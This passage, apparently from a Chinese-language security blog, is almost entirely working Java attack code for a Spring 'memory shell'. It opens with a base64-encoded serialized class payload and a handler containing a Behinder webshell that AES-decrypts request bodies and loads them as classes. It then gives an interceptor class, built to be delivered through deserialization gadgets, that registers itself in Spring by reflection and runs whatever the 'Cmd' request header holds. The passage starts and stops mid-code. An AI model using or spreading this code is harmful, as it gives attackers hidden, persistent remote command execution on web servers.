mEvbGFuZy9PYmplY3Q7KVoBAAZvdXRwdXQBABZMamF2YS9pby9PdXRwdXRTdHJlYW07AQAHcHJvY2VzcwEAE0xqYXZhL2xhbmcvUHJvY2VzczsBAAVpbnB1dAEAFUxqYXZhL2lvL0lucHV0U3RyZWFtOwEABGJhb3MBAB9MamF2YS9pby9CeXRlQXJyYXlPdXRwdXRTdHJlYW07AQAGYnVmZmVyAQACW0IBAAdyZXF1ZXN0AQAnTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3Q7AQAIcmVzcG9uc2UBAChMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2U7AQASTGphdmEvbGFuZy9PYmplY3Q7AQADY21kAQASTGphdmEvbGFuZy9TdHJpbmc7AQANU3RhY2tNYXBUYWJsZQcAfgcAnQcAngcAnwcAoAcAoQcAogcAowcAjgcAVgEAClNvdXJjZUZpbGUBABpTcHJpbmdJbnRlcmNlcHRvckVjaG8uamF2YQwAKAApBwCkDAClAKYBAEBvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9jb250ZXh0L3JlcXVlc3QvU2VydmxldFJlcXVlc3RBdHRyaWJ1dGVzDACnAKgHAJ0MAKkAqgcAqwwArACtAQBSb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvc2VydmxldC9tdmMvbWV0aG9kL2Fubm90YXRpb24vUmVxdWVzdE1hcHBpbmdIYW5kbGVyTWFwcGluZwcArgwArwCwAQA+b3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvc2VydmxldC9oYW5kbGVyL0Fic3RyYWN0SGFuZGxlck1hcHBpbmcHALEMALIAswcAtAwAtQC2DAC3ALgBAA5qYXZhL3V0aWwvTGlzdAEAKmNvbS9leGFtcGxlL01lbVNoZWxsL1NwcmluZ0ludGVyY2VwdG9yRWNobwwAKAA7DAC5ALoBAANDbWQMALsAvAcAngwAvQA7AQAMQ29udGVudC1UeXBlAQAJdGV4dC9odG1sDAC+AL8MAMAAwQcAwgwAwwDEDADFAMYHAKIMAMcAyAEAHWphdmEvaW8vQnl0ZUFycmF5T3V0cHV0U3RyZWFtBwCjDADJAMoMAMsAzAEAAQoHAKAMAM0AzgwAzwApDADQAM4HAKEMANEAKQEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQBADJvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9zZXJ2bGV0L0hhbmRsZXJJbnRlcmNlcHRvcgEAE2phdmEvbGFuZy9FeGNlcHRpb24BADljb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvVHJhbnNsZXRFeGNlcHRpb24BACVqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0AQAmamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2UBABBqYXZhL2xhbmcvT2JqZWN0AQAQamF2YS9sYW5nL1N0cmluZwEAFGphdmEvaW8vT3V0cHV0U3RyZWFtAQARamF2YS9sYW5nL1Byb2Nlc3MBABNqYXZhL2lvL0lucHV0U3RyZWFtAQA8b3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvY29udGV4dC9yZXF1ZXN0L1JlcXVlc3RDb250ZXh0SG9sZGVyAQAYY3VycmVudFJlcXVlc3RBdHRyaWJ1dGVzAQA9KClMb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvY29udGV4dC9yZXF1ZXN0L1JlcXVlc3RBdHRyaWJ1dGVzOwEACmdldFJlcXVlc3QBACkoKUxqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0OwEAEWdldFNlcnZsZXRDb250ZXh0AQAgKClMamF2YXgvc2VydmxldC9TZXJ2bGV0Q29udGV4dDsBAEJvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9jb250ZXh0L3N1cHBvcnQvV2ViQXBwbGljYXRpb25Db250ZXh0VXRpbHMBABhnZXRXZWJBcHBsaWNhdGlvbkNvbnRleHQBAFcoTGphdmF4L3NlcnZsZXQvU2VydmxldENvbnRleHQ7KUxvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9jb250ZXh0L1dlYkFwcGxpY2F0aW9uQ29udGV4dDsBADVvcmcvc3ByaW5nZnJhbWV3b3JrL3dlYi9jb250ZXh0L1dlYkFwcGxpY2F0aW9uQ29udGV4dAEAB2dldEJlYW4BACUoTGphdmEvbGFuZy9DbGFzczspTGphdmEvbGFuZy9PYmplY3Q7AQAPamF2YS9sYW5nL0NsYXNzAQAQZ2V0RGVjbGFyZWRGaWVsZAEALShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9yZWZsZWN0L0ZpZWxkOwEAF2phdmEvbGFuZy9yZWZsZWN0L0ZpZWxkAQANc2V0QWNjZXNzaWJsZQEABChaKVYBAANnZXQBACYoTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwEAA2FkZAEAFShMamF2YS9sYW5nL09iamVjdDspWgEACWdldEhlYWRlcgEAJihMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmc7AQAJc2V0U3RhdHVzAQAJc2V0SGVhZGVyAQAnKExqYXZhL2xhbmcvU3RyaW5nO0xqYXZhL2xhbmcvU3RyaW5nOylWAQAPZ2V0T3V0cHV0U3RyZWFtAQAlKClMamF2YXgvc2VydmxldC9TZXJ2bGV0T3V0cHV0U3RyZWFtOwEAEWphdmEvbGFuZy9SdW50aW1lAQAKZ2V0UnVudGltZQEAFSgpTGphdmEvbGFuZy9SdW50aW1lOwEABGV4ZWMBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsBAA5nZXRJbnB1dFN0cmVhbQEAFygpTGphdmEvaW8vSW5wdXRTdHJlYW07AQAEcmVhZAEABShbQilJAQAFd3JpdGUBAAUoW0IpVgEACGdldEJ5dGVzAQAEKClbQgEABWNsb3NlAQALdG9CeXRlQXJyYXkBAAVmbHVzaAAhAA8AJgABACcAAAAFAAEAKAApAAIAKgAAAMoABAAFAAAASiq3AAG4AALAAAO2AAS5AAUBALgABkwrEge5AAgCAMAAB00SCRIKtgALTi0EtgAMLSy2AA3AAA46BBkEuwAPWQS3ABC5ABECAFexAAAAAwArAAAAIgAIAAAAGQAEABsAFgAeACIAIQAqACIALwAjADkAJABJACgALAAAADQABQAAAEoALQAuAAAAFgA0AC8AMAABACIAKAAxADIAAgAqACAAMwA0AAMAOQARADUANgAEADcAAAAMAAEAOQARADUAOAAEADkAAAAEAAEAOgABACgAOwACACoAAAA9AAEAAgAAAAUqtwABsQAAAAIAKwAAAAoAAgAAACoABAAsACwAAAAWAAIAAAAFAC0ALgAAAAAABQA8AD0AAQA+AAAABQEAPAAAAAEAPwBAAAMAKgAAAEkAAAAEAAAAAbEAAAACACsAAAAGAAEAAAAxACwAAAAqAAQAAAABAC0ALgAAAAAAAQBBAEIAAQAAAAEAQwBEAAIAAAABAEUARgADADkAAAAEAAEARwA+AAAADQMAQQAAAEMAAABFAAAAAQA/AEgAAwAqAAAAPwAAAAMAAAABsQAAAAIAKwAAAAYAAQAAADYALAAAACAAAwAAAAEALQAuAAAAAAABAEEAQgABAAAAAQBJAEoAAgA5AAAABAABAEcAPgAAAAkCAEEAAABJAAAAAQBLAEwAAwAqAAABtwADAAsAAACDKxISuQATAgA6BCwRAMi5ABQCACwSFRIWuQAXAwAZBMYAYiy5ABgBADoFuAAZGQS2ABo6BhkGtgAbOge7ABxZtwAdOggRBAC8CDoKGQcZCrYAHlk2CQKfAA0ZCBkKtgAfp//rGQgSILYAIbYAHxkHtgAiGQUZCLYAI7YAJBkFtgAlBKwAAAADACsAAABCABAAAAA6AAoAOwATADwAHQA9ACIAPgAqAD8ANABAADsAQQBEAEMASwBEAFkARQBjAEcAbQBIAHIASQB8AEoAgQBMACwAAABwAAsAKgBXAE0ATgAFADQATQBPAFAABgA7AEYAUQBSAAcARAA9AFMAVAAIAFUALAA8AD0ACQBLADYAVQBWAAoAAACDAC0ALgAAAAAAgwBXAFgAAQAAAIMAWQBaAAIAAACDAEUAWwADAAoAeQBcAF0ABABeAAAAZAAD/wBLAAsHAF8HAGAHAGEHAGIHAGMHAGQHAGUHAGYHAGcABwBoAAD/ABcACwcAXwcAYAcAYQcAYgcAYwcAZAcAZQcAZgcAZwEHAGgAAP8AHQAFBwBfBwBgBwBhBwBiBwBjAAAAOQAAAAQAAQA6AD4AAAANAwBXAAAAWQAAAEUAAAABAGkAAAACAGpwdAAFSGVsbG9wdwEAeHg=&#34;</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=n>String</span><span class=w> </span><span class=n>result</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=s>&#34;{\&#34;code\&#34;: \&#34;200\&#34;, \&#34;message\&#34;: \&#34;&#34;</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=n>payload</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=s>&#34;\&#34;}&#34;</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=n>OutputStream</span><span class=w> </span><span class=n>output</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>response</span><span class=p>.</span><span class=na>getOutputStream</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=n>output</span><span class=p>.</span><span class=na>write</span><span class=p>(</span><span class=n>result</span><span class=p>.</span><span class=na>getBytes</span><span class=p>());</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=n>output</span><span class=p>.</span><span class=na>flush</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>counter</span><span class=w> </span><span class=o>++</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=k>return</span><span class=w> </span><span class=kc>false</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>request</span><span class=p>.</span><span class=na>getMethod</span><span class=p>().</span><span class=na>equals</span><span class=p>(</span><span class=s>&#34;POST&#34;</span><span class=p>)</span><span class=w> </span><span class=o>&amp;&amp;</span><span class=w> </span><span class=s>&#34;true&#34;</span><span class=p>.</span><span class=na>equals</span><span class=p>(</span><span class=n>request</span><span class=p>.</span><span class=na>getHeader</span><span class=p>(</span><span class=s>&#34;Behinder&#34;</span><span class=p>)))</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=k>try</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=n>String</span><span class=w> </span><span class=n>k</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=s>&#34;e45e329feb5d925b&#34;</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=n>session</span><span class=p>.</span><span class=na>putValue</span><span class=p>(</span><span class=s>&#34;u&#34;</span><span class=p>,</span><span class=w> </span><span class=n>k</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=n>Cipher</span><span class=w> </span><span class=n>c</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>Cipher</span><span class=p>.</span><span class=na>getInstance</span><span class=p>(</span><span class=s>&#34;AES&#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=n>c</span><span class=p>.</span><span class=na>init</span><span class=p>(</span><span class=n>2</span><span class=p>,</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>SecretKeySpec</span><span class=p>(</span><span class=n>k</span><span class=p>.</span><span class=na>getBytes</span><span class=p>(),</span><span class=w> </span><span class=s>&#34;AES&#34;</span><span class=p>));</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=kt>byte</span><span class=o>[]</span><span class=w> </span><span class=n>data</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>c</span><span class=p>.</span><span class=na>doFinal</span><span class=p>(</span><span class=k>new</span><span class=w> </span><span class=n>sun</span><span class=p>.</span><span class=na>misc</span><span class=p>.</span><span class=na>BASE64Decoder</span><span class=p>().</span><span class=na>decodeBuffer</span><span class=p>(</span><span class=n>request</span><span class=p>.</span><span class=na>getReader</span><span class=p>().</span><span class=na>readLine</span><span class=p>()));</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=n>Method</span><span class=w> </span><span class=n>m</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>Class</span><span class=p>.</span><span class=na>forName</span><span class=p>(</span><span class=s>&#34;java.lang.ClassLoader&#34;</span><span class=p>).</span><span class=na>getDeclaredMethod</span><span class=p>(</span><span class=s>&#34;defineClass&#34;</span><span class=p>,</span><span class=w> </span><span class=kt>byte</span><span class=o>[]</span><span class=p>.</span><span class=na>class</span><span class=p>,</span><span class=w> </span><span class=kt>int</span><span class=p>.</span><span class=na>class</span><span class=p>,</span><span class=w> </span><span class=kt>int</span><span class=p>.</span><span class=na>class</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=n>m</span><span class=p>.</span><span class=na>setAccessible</span><span class=p>(</span><span class=kc>true</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=n>Class</span><span class=w> </span><span class=n>clazz</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=p>(</span><span class=n>Class</span><span class=p>)</span><span class=w> </span><span class=n>m</span><span class=p>.</span><span class=na>invoke</span><span class=p>(</span><span class=n>Thread</span><span class=p>.</span><span class=na>currentThread</span><span class=p>().</span><span class=na>getContextClassLoader</span><span class=p>(),</span><span class=n>data</span><span class=p>,</span><span class=w> </span><span class=n>0</span><span class=p>,</span><span class=w> </span><span class=n>data</span><span class=p>.</span><span class=na>length</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=n>clazz</span><span class=p>.</span><span class=na>newInstance</span><span class=p>().</span><span class=na>equals</span><span class=p>(</span><span class=n>pageContext</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=p>}</span><span class=w> </span><span class=k>catch</span><span class=w> </span><span class=p>(</span><span class=n>Exception</span><span class=w> </span><span class=n>e</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>                </span><span class=n>e</span><span class=p>.</span><span class=na>printStackTrace</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=k>return</span><span class=w> </span><span class=kc>false</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w> </span><span class=k>else</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=k>return</span><span class=w> </span><span class=kc>true</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=p>}</span><span class=w>
</span></span></span></code></pre></td></tr></table></div></div><p>server 的</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span><span class=lnt>58
</span><span class=lnt>59
</span><span class=lnt>60
</span><span class=lnt>61
</span><span class=lnt>62
</span><span class=lnt>63
</span><span class=lnt>64
</span><span class=lnt>65
</span><span class=lnt>66
</span><span class=lnt>67
</span><span class=lnt>68
</span><span class=lnt>69
</span><span class=lnt>70
</span><span class=lnt>71
</span><span class=lnt>72
</span><span class=lnt>73
</span><span class=lnt>74
</span><span class=lnt>75
</span><span class=lnt>76
</span><span class=lnt>77
</span><span class=lnt>78
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=kn>package</span><span class=w> </span><span class=nn>org.example</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>com.sun.org.apache.xalan.internal.xsltc.DOM</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>com.sun.org.apache.xalan.internal.xsltc.TransletException</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>com.sun.org.apache.xml.internal.dtm.DTMAxisIterator</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>com.sun.org.apache.xml.internal.serializer.SerializationHandler</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>org.springframework.web.context.WebApplicationContext</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>org.springframework.web.context.request.RequestContextHolder</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>org.springframework.web.context.request.ServletRequestAttributes</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>org.springframework.web.context.support.WebApplicationContextUtils</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>org.springframework.web.servlet.HandlerInterceptor</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>org.springframework.web.servlet.handler.AbstractHandlerMapping</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>javax.servlet.http.HttpServletRequest</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>javax.servlet.http.HttpServletResponse</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>java.io.ByteArrayOutputStream</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>java.io.InputStream</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>java.io.OutputStream</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>java.lang.reflect.Field</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kn>import</span><span class=w> </span><span class=nn>java.util.List</span><span class=p>;</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=kd>public</span><span class=w> </span><span class=kd>class</span> <span class=nc>SpringInterceptorEcho1</span><span class=w> </span><span class=kd>extends</span><span class=w> </span><span class=n>AbstractTranslet</span><span class=w> </span><span class=kd>implements</span><span class=w> </span><span class=n>HandlerInterceptor</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=nf>SpringInterceptorEcho1</span><span class=p>()</span><span class=w> </span><span class=kd>throws</span><span class=w> </span><span class=n>Exception</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=c1>// 获取 WebApplicationContext</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>WebApplicationContext</span><span class=w> </span><span class=n>context</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>WebApplicationContextUtils</span><span class=p>.</span><span class=na>getWebApplicationContext</span><span class=p>(((</span><span class=n>ServletRequestAttributes</span><span class=p>)</span><span class=w> </span><span class=n>RequestContextHolder</span><span class=p>.</span><span class=na>currentRequestAttributes</span><span class=p>()).</span><span class=na>getRequest</span><span class=p>().</span><span class=na>getServletContext</span><span class=p>());</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=c1>// 获取 RequestMappingHandlerMapping</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>RequestMappingHandlerMapping</span><span class=w> </span><span class=n>requestMappingHandlerMapping</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>context</span><span class=p>.</span><span class=na>getBean</span><span class=p>(</span><span class=n>RequestMappingHandlerMapping</span><span class=p>.</span><span class=na>class</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=c1>// 注册 Interceptor</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>Field</span><span class=w> </span><span class=n>field</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>AbstractHandlerMapping</span><span class=p>.</span><span class=na>class</span><span class=p>.</span><span class=na>getDeclaredField</span><span class=p>(</span><span class=s>&#34;adaptedInterceptors&#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>field</span><span class=p>.</span><span class=na>setAccessible</span><span class=p>(</span><span class=kc>true</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>List</span><span class=o>&lt;</span><span class=n>HandlerInterceptor</span><span class=o>&gt;</span><span class=w> </span><span class=n>adaptedInterceptors</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=p>(</span><span class=n>List</span><span class=o>&lt;</span><span class=n>HandlerInterceptor</span><span class=o>&gt;</span><span class=p>)</span><span class=w> </span><span class=n>field</span><span class=p>.</span><span class=na>get</span><span class=p>(</span><span class=n>requestMappingHandlerMapping</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>adaptedInterceptors</span><span class=p>.</span><span class=na>add</span><span class=p>(</span><span class=k>new</span><span class=w> </span><span class=n>SpringInterceptorEcho1</span><span class=p>(</span><span class=n>1</span><span class=p>));</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=c1>// 匹配特定路径的 Interceptor</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w></span><span class=c1>//        MappedInterceptor mappedInterceptor = new MappedInterceptor(new String[]{&#34;/demo&#34;}, null, new SpringInterceptor(1));</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=nf>SpringInterceptorEcho1</span><span class=p>(</span><span class=kt>int</span><span class=w> </span><span class=n>n</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=nd>@Override</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=kt>void</span><span class=w> </span><span class=nf>transform</span><span class=p>(</span><span class=n>DOM</span><span class=w> </span><span class=n>document</span><span class=p>,</span><span class=w> </span><span class=n>DTMAxisIterator</span><span class=w> </span><span class=n>iterator</span><span class=p>,</span><span class=w> </span><span class=n>SerializationHandler</span><span class=w> </span><span class=n>handler</span><span class=p>)</span><span class=w> </span><span class=kd>throws</span><span class=w> </span><span class=n>TransletException</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=nd>@Override</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=kt>void</span><span class=w> </span><span class=nf>transform</span><span class=p>(</span><span class=n>DOM</span><span class=w> </span><span class=n>document</span><span class=p>,</span><span class=w> </span><span class=n>SerializationHandler</span><span class=o>[]</span><span class=w> </span><span class=n>handlers</span><span class=p>)</span><span class=w> </span><span class=kd>throws</span><span class=w> </span><span class=n>TransletException</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=p>}</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=nd>@Override</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>    </span><span class=kd>public</span><span class=w> </span><span class=kt>boolean</span><span class=w> </span><span class=nf>preHandle</span><span class=p>(</span><span class=n>HttpServletRequest</span><span class=w> </span><span class=n>request</span><span class=p>,</span><span class=w> </span><span class=n>HttpServletResponse</span><span class=w> </span><span class=n>response</span><span class=p>,</span><span class=w> </span><span class=n>Object</span><span class=w> </span><span class=n>handler</span><span class=p>)</span><span class=w> </span><span class=kd>throws</span><span class=w> </span><span class=n>Exception</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>String</span><span class=w> </span><span class=n>cmd</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>request</span><span class=p>.</span><span class=na>getHeader</span><span class=p>(</span><span class=s>&#34;Cmd&#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>response</span><span class=p>.</span><span class=na>setStatus</span><span class=p>(</span><span class=n>200</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=n>response</span><span class=p>.</span><span class=na>setHeader</span><span class=p>(</span><span class=s>&#34;Content-Type&#34;</span><span class=p>,</span><span class=w> </span><span class=s>&#34;text/html&#34;</span><span class=p>);</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>        </span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>cmd</span><span class=w> </span><span class=o>!=</span><span class=w> </span><span class=kc>null</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>OutputStream</span><span class=w> </span><span class=n>output</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>response</span><span class=p>.</span><span class=na>getOutputStream</span><span class=p>();</span><span class=w>
</span></span></span><span class=line><span class=cl><span class=w>            </span><span class=n>Process</span><span class=w> </span><span class=n>process</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>Runtime</span><span class=p>.</span><span class=na>getRuntime</span><span class=p>().</span><span class=na>exec</span><span class=p>(</span><span class=n>cmd</span><span class=p>);</span><span class=w>
